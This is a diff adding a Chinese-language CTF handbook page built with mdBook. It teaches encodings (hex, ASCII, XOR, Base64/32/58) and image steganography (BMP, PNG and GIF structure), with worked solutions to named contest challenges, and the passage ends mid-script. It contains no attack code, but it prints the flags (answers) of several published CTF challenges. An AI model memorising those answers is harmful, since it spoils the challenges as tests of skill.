@@ -1,0 +1,2828 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>CTF Handbook</title>
+        <meta name="robots" content="noindex">
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="CTF">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" id="highlight-css" href="highlight.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="tomorrow-night.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="theme/pagetoc.css">
+
+        <!-- MathJax -->
+        <script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+        <!-- Provide site root and default themes to javascript -->
+        <script>
+            const path_to_root = "";
+            const default_light_theme = "light";
+            const default_dark_theme = "navy";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="toc.js"></script>
+    </head>
+    <body>
+    <div id="mdbook-help-container">
+        <div id="mdbook-help-popup">
+            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
+            <div>
+                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
+                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
+                <p>Press <kbd>?</kbd> to show this help</p>
+                <p>Press <kbd>Esc</kbd> to hide this help</p>
+            </div>
+        </div>
+    </div>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                let theme = localStorage.getItem('mdbook-theme');
+                let sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
+            let theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            let sidebar = null;
+            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">CTF Handbook</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                        <a href="https://github.com/Fenguopeng/ctf101" title="Git repository" aria-label="Git repository">
+                            <i id="git-repository-button" class="fa fa-github"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="编码"><a class="header" href="#编码">编码</a></h1>
+<h2 id="进制"><a class="header" href="#进制">进制</a></h2>
+<h3 id="二进制binary"><a class="header" href="#二进制binary">二进制（Binary）</a></h3>
+<p><img src="encodings/../images/Binary.png" alt="Binary" /></p>
+<p>二进制是一种使用 <code>0</code> 和 <code>1</code> 的数值表示方式。每个二进制位称为<code>比特</code>（bit）。</p>
+<h3 id="八进制octal"><a class="header" href="#八进制octal">八进制（Octal）</a></h3>
+<h3 id="十进制decimal"><a class="header" href="#十进制decimal">十进制（Decimal）</a></h3>
+<h3 id="十六进制hexadecimal"><a class="header" href="#十六进制hexadecimal">十六进制（Hexadecimal）</a></h3>
+<p>十六进制是一种基数为 16 的数值表示法，数字是由 0 到 9 和 A 到 F 组成，广泛应用于计算机科学及其相关领域。</p>
+<p><img src="encodings/../images/bytes-hexadecimal.png" alt="bytes-hexadecimal" /></p>
+<p>由于 1 Byte = 8 Bit，一个字节的一半（4 位）有 16 种不同的组合，也就是说可以用两个十六进制数来表示一个字节。</p>
+<p>常见用来表示十六进制数的前缀有<code>0x</code>和<code>\x</code>，如<code>0xA</code>、<code>\x61</code>等。</p>
+<p><code>666c61677b733333696e675f6833787d</code></p>
+<p><a href="https://gchq.github.io/CyberChef/#recipe=From_Hex(&#x27;None&#x27;)&amp;input=NjY2YzYxNjc3YjczMzMzMzY5NmU2NzVmNjgzMzc4N2Q&amp;ieol=CRLF&amp;oeol=CRLF">CyberChef</a></p>
+<pre><code class="language-bash">$ python3
+Python 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+&gt;&gt;&gt; bytes.fromhex("666c61677b733333696e675f6833787d").decode()
+'flag{s33ing_h3x}'
+</code></pre>
+<h2 id="ascii"><a class="header" href="#ascii">ASCII</a></h2>
+<p>ASCII（<strong>A</strong>merican <strong>S</strong>tandard <strong>C</strong>ode for <strong>I</strong>nformation <strong>I</strong>nterchange，美国标准信息交换码）是一种字符编码方案。</p>
+<p>在计算机中，所有数据存储和运算都使用二进制表示，因计算机通过高电平和低电平分别对应 1 和 0。字母、数字以及常用符号在计算机中也需要使用二进制表示。为确保互通，必须使用统一的编码规则，因此美国标准化组织制定了 ASCII 编码，规定了常用符号对应的二进制数字。</p>
+<p>标准 ASCII 使用 7 个比特来表示字符，因此可以编码 128 个不同的字符。扩展 ASCII 是在标准 ASCII 的基础上，使用 8 个比特来表示字符。</p>
+<p><img src="encodings/../images/ASCII-Table-wide.svg" alt="ASCII-Table" /></p>
+<h2 id="unicode"><a class="header" href="#unicode">Unicode</a></h2>
+<p>Unicode 是一种计算机字符编码标准，于 1987 年首次提出，旨在为所有语言和字符提供一个统一的编码系统。它的主要目的是解决不同字符集之间的不兼容问题，确保能够在全球范围内一致地处理和显示文本。Unicode 支持几乎所有现代书写系统，包括拉丁文、汉字、阿拉伯文、希腊文、德文和许多其他语言的符号和字符。</p>
+<p>Unicode 支持多种编码形式，以满足不同应用程序的需求，包括：</p>
+<ul>
+<li>UTF-8：可变长度编码，兼容 ASCII，广泛用于互联网和现代应用。一个字符可以使用 1 到 4 个字节表示。对于 ASCII 字符（0-127），编码与标准 ASCII 相同；而对于其他字符，UTF-8 使用多个字节。</li>
+<li>UTF-16：通常用于需要处理大量东亚字符的环境，比如 Java 和 Windows。它使用 2 或 4 个字节表示每个字符。</li>
+<li>UTF-32：固定长度编码，使用 4 个字节表示每个字符，常用于内部处理和某些特定情况下。</li>
+</ul>
+<h2 id="url编码"><a class="header" href="#url编码">URL编码</a></h2>
+<h2 id="html实体编码"><a class="header" href="#html实体编码">HTML实体编码</a></h2>
+<h2 id="异或xor"><a class="header" href="#异或xor">异或<code>XOR</code></a></h2>
+<p>异或（XOR）是一种<strong>位运算符</strong>，符号为 <code>^</code>。其规则是：<strong>两个二进制位相同则结果为 0，不同则结果为 1</strong>。</p>
+<div class="table-wrapper"><table><thead><tr><th>A</th><th>B</th><th>A ^ B</th></tr></thead><tbody>
+<tr><td>0</td><td>0</td><td>0</td></tr>
+<tr><td>0</td><td>1</td><td>1</td></tr>
+<tr><td>1</td><td>0</td><td>1</td></tr>
+<tr><td>1</td><td>1</td><td>0</td></tr>
+</tbody></table>
+</div>
+<p>异或的性质：</p>
+<ol>
+<li>任意数与 0 异或结果为其本身：<code>A ^ 0 = A</code></li>
+<li>任意数与自身异或结果为 0：<code>A ^ A = 0</code></li>
+<li>异或运算满足交换律和结合律：<code>A ^ B = B ^ A</code>，<code>(A ^ B) ^ C = A ^ (B ^ C)</code></li>
+</ol>
+<h3 id="示例代码"><a class="header" href="#示例代码">示例代码</a></h3>
+<h2 id="例题分析"><a class="header" href="#例题分析">例题分析</a></h2>
+<h3 id="例题-xor"><a class="header" href="#例题-xor">例题-<code>XOR</code></a></h3>
+<pre><code>79737e786477706f7a4066706a406a6c7a7b407e406c7c6d766f6b62
+</code></pre>
+<ul>
+<li>题目分析</li>
+</ul>
+<p>题目提供了一串十六进制数字，我们知道两个十六进制数字可以表示一个字节。根据题目名称，可以通过暴力破解方式来寻找异或秘钥，以实现解密。</p>
+<ul>
+<li>解法一</li>
+</ul>
+<pre><code class="language-python">cipher = bytes.fromhex("79737e786477706f7a4066706a406a6c7a7b407e406c7c6d766f6b62")
+
+# 遍历所有可能的单字节密钥（从 0x00 到 0xff）
+for i in range(0x00, 0xff):
+    result = "".join(chr(i ^ j) for j in cipher)
+    if "flag" in result:
+        print("Flag found:", result)
+</code></pre>
+<ul>
+<li>解法二</li>
+</ul>
+<p>我们主要使用 <a href="https://gchq.github.io/CyberChef/#recipe=From_Hex(&#x27;None&#x27;)XOR_Brute_Force(1,100,0,&#x27;Standard&#x27;,false,true,false,&#x27;flag&#x27;)&amp;input=Nzk3MzdlNzg2NDc3NzA2ZjdhNDA2NjcwNmE0MDZhNmM3YTdiNDA3ZTQwNmM3YzZkNzY2ZjZiNjI">CyberChef</a> 的<code>XOR Brute Force</code>模块，在正确使用该模块之前，需要首先使用<code>From Hex</code>功能将提供的字符串转为以两个十六进制数表示的字节数组。</p>
+<p><img src="encodings/../images/cyberchef-xor-brute-force.png" alt="CyberChef XOR Brute Force" /></p>
+<h2 id="字母频率统计"><a class="header" href="#字母频率统计">字母频率统计</a></h2>
+<pre><code class="language-bash">$ cat flag.txt | fold -w1 | sort | uniq -c | sort -nr
+2508 G
+2481 X
+2453 Y
+2301 {
+2221 g
+2087 a
+</code></pre>
+<ul>
+<li><code>fold -w1</code> 将每个字符放在单独的一行。</li>
+<li><code>sort</code> 对字符进行排序。</li>
+<li><code>uniq -c</code> 统计出现次数。</li>
+<li><code>sort -nr</code> 根据出现次数从高到低排序。</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="base编码"><a class="header" href="#base编码">Base编码</a></h1>
+<h2 id="base64"><a class="header" href="#base64">Base64</a></h2>
+<p>Base64 是一种基于 64 个可打印字符来表示二进制数据的表示方法，3 个字节可由 4 个可打印字符表示。64 个可打印字符包括大小写字母<code>a-z</code>、<code>A-Z</code>，数字<code>0-9</code>以及两个特殊字符<code>+</code> 和 <code>/</code>，因此命名为“Base64”。</p>
+<pre><code class="language-bash">$ echo hello | base64
+aGVsbG8K
+
+$ echo aGVsbG8K | base64 -d
+hello
+</code></pre>
+<h2 id="base32"><a class="header" href="#base32">Base32</a></h2>
+<pre><code>A-Z（26个大写字母）
+2-7（数字，不包括易于混淆的数字0和1）
+</code></pre>
+<h2 id="base58"><a class="header" href="#base58">Base58</a></h2>
+<p><code>123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ</code>，与Base64相比，排除了数字<code>0</code>、大写字母<code>O</code>、大写字符<code>I</code>、小写字母<code>l</code>，避免混淆。</p>
+<p>主要用于比特币地址、私钥、钱包文件等的编码，避免容易混淆字符，提高用户输入体验。</p>
+<h2 id="base62"><a class="header" href="#base62">Base62</a></h2>
+<h2 id="base85"><a class="header" href="#base85">Base85</a></h2>
+<h2 id="例题分析-1"><a class="header" href="#例题分析-1">例题分析</a></h2>
+<h3 id="例题-base"><a class="header" href="#例题-base">例题-<code>Base</code></a></h3>
+<p>题目来源：2021 年中国能源网络安全大赛预赛</p>
+<p>题目描述：
+<code>31332b353d3f3f3f2d2d2d2d7a6d6a74706d3838757366677a6d797474736467746d65697a6c6c74787a6d657a61646a766d6f66757365677262776b7a77666a7a61796f7a646d75373d3d3d</code></p>
+<p>题目分析：</p>
+<p>首先十六进制解码，得<code>13+5=???----zmjtpm88usfgzmyttsdgtmeizlltxzmezadjvmofusegrbwkzwfjzayozdmu7===</code>，提示字符串<code>13+5=???-</code>，有效字符串只有小写字母和数字，且存在数字<code>8</code>，判断不是转为大写后得<code>Base 32</code>，根据提示<code>13+5</code>，需要对字母和数字作如下转换：</p>
+<ul>
+<li>小写字母进行<code>ROT 13</code></li>
+<li>数字进行<code>ROT 5</code></li>
+<li>转为大写字母并<code>Base 32</code>解码</li>
+</ul>
+<p><a href="https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13)ROT13(false,false,true,5)To_Upper_case(&#x27;All&#x27;)From_Base32(&#x27;A-Z2-7%3D&#x27;,true)&amp;input=em1qdHBtODh1c2Znem15dHRzZGd0bWVpemxsdHh6bWV6YWRqdm1vZnVzZWdyYndrendmanpheW96ZG11Nz09PQ&amp;ieol=CRLF&amp;oeol=NEL">CyberChef</a></p>
+<p>FLAG：<code>flag{9e6ef1a3f5f0e31cadd29c297bef5ad2}</code></p>
+<h2 id="练习题"><a class="header" href="#练习题">练习题</a></h2>
+<h3 id="ez_xor"><a class="header" href="#ez_xor">EZ_XOR</a></h3>
+<p>题目来源：2018护网杯线上赛</p>
+<p><code>AAoHAR1WX1VQVlNVU1VRUl5XXyMjI1FWJ1IjUCQnXlZWXyckXhs=</code></p>
+<p>FLAG：<code>flag{09360535374819EEE70A4E6BA8009AB8}</code></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="隐写术"><a class="header" href="#隐写术">隐写术</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="图像隐写"><a class="header" href="#图像隐写">图像隐写</a></h1>
+<p>图像隐写是一种将数据（包括文本、图像、音频、视频）嵌入到图像中的信息隐藏技术，人类视觉上通常无法区分处理过的图像和原始图像。图像隐写技术的基本原理是利用人类视觉系统的特性和图像的冗余信息，通过对图像中特定像素的微小修改来实现数据的隐藏。该技术广泛应用于数据传输中的安全通信、版权保护以及隐私保护等领域。</p>
+<h2 id="bmp"><a class="header" href="#bmp">BMP</a></h2>
+<p><a href="https://zh.wikipedia.org/wiki/BMP">BMP</a>（Bitmap，位图）是一种于 1986 年随着 Microsoft Windows 1.0 发布而推出的<strong>无压缩</strong>图像文件格式，广泛用于 Windows 系统中，采用简单结构存储像素数据。</p>
+<p>BMP 文件由以下部分组成：</p>
+<ul>
+<li><strong>文件头</strong>（Bitmap File Header）：固定 14 个字节，包含文件类型标识（字符<code>BM</code>），文件大小、像素数据偏移量等。</li>
+<li><strong>信息头</strong>（DIB Header）：紧跟文件头之后，包含图像宽度、高度、色深、压缩方式等信息。大小和格式有多种版本，常见为 40 字节的<code>BITMAPINFOHEADER</code>，也有向下兼容<code>BITMAPV5INFOHEADER</code>。</li>
+<li>（可选）<strong>颜色表</strong>（Color Table）：用于索引颜色，支持 1、4、8 位色深索引色，24 位及以上多为直接颜色值。
+<ul>
+<li>1 位色深，单色位图，每个像素用 1 位表示，即 2 种颜色，每像素占 $1/8$ 字节。</li>
+<li>4 位色深，16 色位图，每个像素用 4 位表示，即 16 种颜色，每像素占$1/2$字节。</li>
+<li>8 位色深，256 色位图，每个像素用 8 位表示，即 256 种颜色，每像素占 1 节。</li>
+<li>24 位色深，24 位位图，每个像素用 3 字节表示。</li>
+</ul>
+</li>
+<li><strong>像素数据</strong>（Pixel Data）：以行存储，每行字节数必须是 4 的倍数，不足部分用填充字节补齐，像素存储顺序通常<strong>自下而上</strong>。</li>
+</ul>
+<p><img src="stego/../images/BMPfileFormat.svg" alt="BMP Format" /></p>
+<h3 id="例题分析-2"><a class="header" href="#例题分析-2">例题分析</a></h3>
+<h4 id="例题1picoctf-2021tunn3l_v1s10n"><a class="header" href="#例题1picoctf-2021tunn3l_v1s10n">例题1：[PicoCTF 2021]tunn3l_v1s10n</a></h4>
+<ol>
+<li>附件没有后缀名，执行命令<code>file tunn3l_v1s10n</code>，结果是<code>tunn3l_v1s10n: data</code>，无法正确识别文件类型。</li>
+<li>通过十六进制编辑器查看文件。使用命令<code>xxd -g 1 tunn3l_v1s10n | head</code>，判断文件类型为<code>bmp</code>。</li>
+</ol>
+<pre><code>00000000: 42 4d 8e 26 2c 00 00 00 00 00 ba d0 00 00 ba d0  BM.&amp;,...........
+00000010: 00 00 6e 04 00 00 32 01 00 00 01 00 18 00 00 00  ..n...2.........
+00000020: 00 00 58 26 2c 00 25 16 00 00 25 16 00 00 00 00  ..X&amp;,.%...%.....
+00000030: 00 00 00 00 00 00 23 1a 17 27 1e 1b 29 20 1d 2a  ......#..'..) .*
+00000040: 21 1e 26 1d 1a 31 28 25 35 2c 29 33 2a 27 38 2f  !.&amp;..1(%5,)3*'8/
+00000050: 2c 2f 26 23 33 2a 26 2d 24 20 3b 32 2e 32 29 25  ,/&amp;#3*&amp;-$ ;2.2)%
+00000060: 30 27 23 33 2a 26 38 2c 28 36 2b 27 39 2d 2b 2f  0'#3*&amp;8,(6+'9-+/
+00000070: 26 23 1d 12 0e 23 17 11 29 16 0e 55 3d 31 97 76  &amp;#...#..)..U=1.v
+00000080: 66 8b 66 52 99 6d 56 9e 70 58 9e 6f 54 9c 6f 54  f.fR.mV.pX.oT.oT
+00000090: ab 7e 63 ba 8c 6d bd 8a 69 c8 97 71 c1 93 71 c1  .~c..m..i..q..q.
+</code></pre>
+<ol start="3">
+<li>修改后缀后，图片查看器无法正常打开图片，判断文件格式出错。</li>
+<li>修复文件步骤如下：
+<ul>
+<li>文件标识<code>File Offset to PixelArray</code>字段应为<code>36 00 00 00</code>，即十六进制<code>0x36</code>，表示 54 字节。</li>
+<li>信息头<code>DIB Header Size</code>字段应为<code>28 00 00 00</code>，即十六进制<code>0x28</code>，表示 40 字节。</li>
+<li>修改图片高度，(2893454-54)/(1134*3+2) = 850</li>
+</ul>
+</li>
+</ol>
+<p>FLAG：<code>picoCTF{qu1t3_a_v13w_2020}</code></p>
+<p>参考资料：</p>
+<ul>
+<li><a href="https://github.com/HHousen/PicoCTF-2021/tree/master/Forensics/tunn3l%20v1s10n">https://github.com/HHousen/PicoCTF-2021/tree/master/Forensics/tunn3l%20v1s10n</a></li>
+</ul>
+<h3 id="参考资料"><a class="header" href="#参考资料">参考资料</a></h3>
+<ul>
+<li><a href="https://www.ece.ualberta.ca/~elliott/ee552/studentAppNotes/2003_w/misc/bmp_file_format/bmp_file_format.htm">https://www.ece.ualberta.ca/~elliott/ee552/studentAppNotes/2003_w/misc/bmp_file_format/bmp_file_format.htm</a></li>
+</ul>
+<h2 id="tiff"><a class="header" href="#tiff">TIFF</a></h2>
+<h2 id="png"><a class="header" href="#png">PNG</a></h2>
+<p>PNG（Portable Network Graphics，便携式网络图形）是一种广泛使用的无损压缩位图图片格式，具有<code>无损压缩</code>、<code>支持透明通道（Alpha通道）</code>和<code>内置校验</code>等特点。</p>
+<p>PNG 文件包括以下主要部分：</p>
+<ul>
+<li>文件标识（Signature）：8 字节，每个 PNG 文件以字节序列 <code>89 50 4E 47 0D 0A 1A 0A</code> 开头。</li>
+<li>块（Chunks）：PNG 文件由多个不同类型的块组成，分为关键块和辅助块。</li>
+</ul>
+<p>关键数据块中有4个标准数据块：</p>
+<ul>
+<li>IHDR：图像头块，13 个字节，定义图像的基本属性，包含图像宽度、高度、颜色类型等信息。作为第一个数据块出现并只出现一次。</li>
+<li>PLTE：调色板块（可选），定义用于图像的颜色调色板。必须放在图像数据块之前。</li>
+<li>IDAT：图像数据块，存储<code>DEFLATE 算法</code>压缩后的图像像素数据。可以为一个或多个连续块，顺序不可颠倒，</li>
+<li>IEND：图像结束标志，指示文件的结尾。</li>
+</ul>
+<h3 id="idat"><a class="header" href="#idat">IDAT</a></h3>
+<p>IDAT 中的数据是通过 zlib（DEFLATE压缩算法）压缩的像素数据流。
+多个 IDAT 块的数据拼接后构成完整的 zlib 流</p>
+<h3 id="例题分析-3"><a class="header" href="#例题分析-3">例题分析</a></h3>
+<h4 id="例题1"><a class="header" href="#例题1">例题1</a></h4>
+<h4 id="例题2"><a class="header" href="#例题2">例题2</a></h4>
+<pre><code class="language-bash">pngcheck
+
+</code></pre>
+<p>tweakpng</p>
+<h2 id="jpg"><a class="header" href="#jpg">JPG</a></h2>
+<p>JPEG（JPG）是一种广泛应用的<strong>有损压缩</strong>图像格式，具备<code>压缩比灵活</code>、<code>不支持透明通道</code></p>
+<p>有损压缩</p>
+<p>jphide</p>
+<h2 id="gif"><a class="header" href="#gif">GIF</a></h2>
+<p>GIF（Graphics Interchange Format，图形交换格式）是一种由美国技术公司 CompuServe 于 1987 年推出的广泛使用的图像格式，现已成为 W3C 的标准。GIF 文件主要用于支持动画和图像压缩，常见于网页和社交媒体中，尤其是表情包。其优点包括<code>创建速度快</code>、<code>文件体积小</code>和<code>无损压缩</code>，然而，其色彩限制和低分辨率可能影响图像质量。</p>
+<p>自推出以来，GIF 经历了两个主要版本：<code>GIF87a</code>（1987 年）是首个版本，支持最多 256 种颜色和静态图像；<code>GIF89a</code>（1989 年）在此基础上增加了动画支持、透明背景和元数据功能，使其更加灵活和实用。</p>
+<h3 id="文件结构"><a class="header" href="#文件结构">文件结构</a></h3>
+<p><img src="stego/../images/gif_file_format.gif" alt="gif_file_format" /></p>
+<ol>
+<li><strong>文件头（Header）</strong>
+<ul>
+<li><strong>签名（Signature）：</strong> 3 个字节，<code>47 49 46</code>即字符<code>GIF</code>，表示该文件为 GIF 格式。</li>
+<li><strong>版本（Version）：</strong> 3 个字节，指明版本号，两个主要版本分别为<code>87a</code>和<code>89a</code>。</li>
+<li><code>GIF89a</code></li>
+</ul>
+</li>
+<li><strong>逻辑屏幕描述符（Logical Screen Descriptor）</strong>
+<ul>
+<li>描述 GIF 的画布尺寸（宽度和高度）。</li>
+<li>指定全局颜色表的大小和是否使用透明色。</li>
+</ul>
+</li>
+<li><strong>（可选）全球颜色表（Global Color Table）</strong>
+<ul>
+<li>通常用于索引颜色。包含多达 256 种颜色的 RGB 值。每种颜色由三个字节（红、绿、蓝）表示。</li>
+</ul>
+</li>
+<li><strong>图形控制扩展（Graphics Control Extension）</strong>
+<ul>
+<li>提供关于图像显示的控制信息，如延迟时间、透明色的使用及是否是动画帧。</li>
+</ul>
+</li>
+<li><strong>图像描述符（Image Descriptor）</strong>
+<ul>
+<li>描述单个图像的起始位置和尺寸（例如左上角坐标、宽度和高度）。</li>
+<li>可选的局部颜色表也可以在此区块中定义。</li>
+</ul>
+</li>
+<li><strong>局部颜色表（Local Color Table）</strong>
+<ul>
+<li>针对特定图像使用的色彩表，允许不同的图像使用不同的颜色表。</li>
+<li>结构与全局颜色表相同。</li>
+</ul>
+</li>
+<li><strong>图像数据（Image Data）</strong>
+<ul>
+<li>实际的图像像素数据，通常经过 LZW（Lempel-Ziv-Welch）压缩。</li>
+</ul>
+</li>
+<li><strong>（可选）纯文本扩展（Plain Text Extension）</strong>
+<ul>
+<li>可选部分，用于存储文本内容。</li>
+</ul>
+</li>
+<li><strong>应用扩展（Application Extension）</strong>
+<ul>
+<li>存储应用程序相关的信息，通常用于动画控制。</li>
+</ul>
+</li>
+<li><strong>注释扩展（Comment Extension）</strong>
+<ul>
+<li>包含元数据，允许在 GIF 文件中加入注释。</li>
+</ul>
+</li>
+<li><strong>结束块（Trailer）</strong>
+<ul>
+<li>文件的结束标识，通常为一个字节，值为<code>0x3B</code>。</li>
+</ul>
+</li>
+</ol>
+<p>参考资料：</p>
+<ul>
+<li><a href="https://giflib.sourceforge.net/whatsinagif/bits_and_bytes.html">https://giflib.sourceforge.net/whatsinagif/bits_and_bytes.html</a></li>
+<li><a href="https://www.w3.org/Graphics/GIF/spec-gif89a.txt">https://www.w3.org/Graphics/GIF/spec-gif89a.txt</a></li>
+</ul>
+<h3 id="时间轴"><a class="header" href="#时间轴">时间轴</a></h3>
+<h3 id="空间轴"><a class="header" href="#空间轴">空间轴</a></h3>
+<p>ImageMagick 是一款流行的开源软件，支持丰富的数字图像操作。其中，<code>convert</code> 是 ImageMagick 的一个核心命令行工具，用于在不同的图像格式之间转换、修改和组合图像。</p>
+<p>动画 GIF 文件由多帧图像组成，可以使用<code>convert</code>命令将其每一帧分割开。</p>
+<pre><code class="language-bash">convert -version
+</code></pre>
+<pre><code class="language-bash">sudo apt update
+sudo apt install imagemagick
+</code></pre>
+<pre><code class="language-bash">convert filename.gif output.png
+</code></pre>
+<p>也可以使用在线工具<a href="https://ezgif.com/split">https://ezgif.com/split</a> 或 <code>Stegsolve.jar</code>。</p>
+<h4 id="例题1downunderctf-2021how-to-pronounce-gif"><a class="header" href="#例题1downunderctf-2021how-to-pronounce-gif">例题1：[DownUnderCTF 2021]How to pronounce GIF</a></h4>
+<p>附件下载：<a href="stego/../../attachments/stego/challenge.gif">challenge.gif</a></p>
+<p>使用<code>convert</code>命令分离帧，并保存在<code>frames</code>目录下。</p>
+<pre><code class="language-bash">convert challenge.gif frames/frame.png
+</code></pre>
+<p>每十个一组，每组得第一个垂直拼接为一个二维码。</p>
+<pre><code class="language-bash">convert frames/frame-{0,10,20,30,40,50,60,70,80,90,100,110}.png -append QRcode1.png
+convert frames/frame-{1,11,21,31,41,51,61,71,81,91,101,111}.png -append QRcode2.png
+...
+</code></pre>
+<p>共生成 10 个二维码，使用<code>zbarimg</code>命令获取内容。</p>
+<pre><code class="language-bash">$ zbarimg QRcode1.png
+QR-Code:The princess is in another castle
+scanned 1 barcode symbols from 1 images in 0.01 seconds
+</code></pre>
+<p>以此类推，得 QRcode6：<code>RFVDVEZ7YU1</code>，QRcode8：<code>fMV9oYVhYMHJfbjB3P30=</code></p>
+<p>拼接完整，然后 Base64 解码。</p>
+<pre><code class="language-bash">$ echo RFVDVEZ7YU1fMV9oYVhYMHJfbjB3P30= |base64 -d
+DUCTF{aM_1_haXX0r_n0w?}
+</code></pre>
+<h4 id="例题2d3ctf-2023d3gif"><a class="header" href="#例题2d3ctf-2023d3gif">例题2：[D^3CTF 2023]d3gif</a></h4>
+<pre><code class="language-python">from PIL import Image
+
+# 初始化一个空列表，用于存储像素值
+rgb = []
+
+# 读取每个图像并获取左上角像素的 RGB 值
+for i in range(1089):
+    with Image.open(f"frame-{i}.png") as img:
+        # 将图像转换为 RGBA 格式（如果不是的话）
+        img = img.convert("RGBA")
+        # 获取左上角像素的颜色
+        pixel_value = img.getpixel((0, 0))
+        rgb.append(pixel_value)
+
+# 创建一个新的 RGB 图像
+output = Image.new("RGB", (33, 33))
+
+# 根据条件设置每个像素的颜色
+for index, j in enumerate(rgb):
